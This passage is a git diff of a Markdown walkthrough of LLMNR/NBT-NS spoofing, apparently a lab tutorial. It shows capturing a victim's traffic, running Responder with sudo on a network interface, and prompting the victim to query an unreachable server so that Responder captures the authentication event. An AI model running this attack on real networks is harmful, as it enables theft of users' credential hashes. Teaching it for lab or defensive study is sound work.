@@ -4,12 +4,13 @@ LLMNR and NBT-NS Spoofing
 ## Procedure
 - Start Capturing the traffic on the interface you are connected with the filter ```ip.addr == <Address of the victim>```.   
 - Start responder on interface with sudo privileges.
-  ```bash
-  f4lc0n@klaw /g/Responder> sudo ./Responder.py -I eno1 -wrf
+```bash
+f4lc0n@klaw /g/Responder> sudo ./Responder.py -I eno1 -wrf
 ```
+ - The output will be in a similar way.
 
 
-
+```bash
 .----.-----.-----.-----.-----.-----.--|  |.-----.----.
 |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
 |__| |_____|_____|   __|_____|__|__|_____||_____|__|
@@ -61,9 +62,7 @@ Challenge set              [1122334455667788]
 [+] Listening for events...
 ```
 
-- Now start accessing a inaccessible server on the Victim Machine.
-
-![](https://github.com/bj1408/LLMNR-Attack/blob/master/images/VictimSS1.png)
+- Now start accessing a inaccessible server on the Victim Machine.![](https://github.com/bj1408/LLMNR-Attack/blob/master/images/VictimSS1.png)
 
 - Now we can see that Responder captures this event.
 ```bash
